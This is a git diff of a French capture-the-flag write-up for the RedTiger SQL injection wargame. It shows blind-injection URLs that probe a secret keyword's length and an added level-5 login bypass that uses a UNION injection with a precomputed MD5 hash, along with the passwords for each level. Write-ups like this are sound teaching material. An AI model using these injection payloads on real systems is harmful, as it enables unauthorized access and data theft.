@@ -86,7 +86,7 @@ curl --insecure -b level3login=securitycat_says_meow_and_likes_cheese https://re
  
 4. Level 4 : Blind Injection
    Identification de la taille du mot à trouver
-```
+```nix
 https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C10
 => 2 rows
 https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C20
@@ -123,7 +123,19 @@ done
 ==> blindinjection123
 ```
  Word correct. 
- The password for the next level is: bananas_are_not_yellow-sometimes 
+ The password for the next level is: bananas_are_not_yellow-sometimes
+
+```nix
+echo -n toto | md5sum
+f71dbe52628a3f83a77ab494817525c6  -
+
+login : ' union 'pouet', 'f71dbe52628a3f83a77ab494817525c6
+passwd : f71dbe52628a3f83a77ab494817525c6
+```
+  Login successful!
+  
+  The password for the next level is: my_cat_says_meow_meowmeow 
+  
 5. Level 5 : Advanced login-bypass
 6. Level 6 : SQL-Injection
 7. Level 7 : SQL-Injection
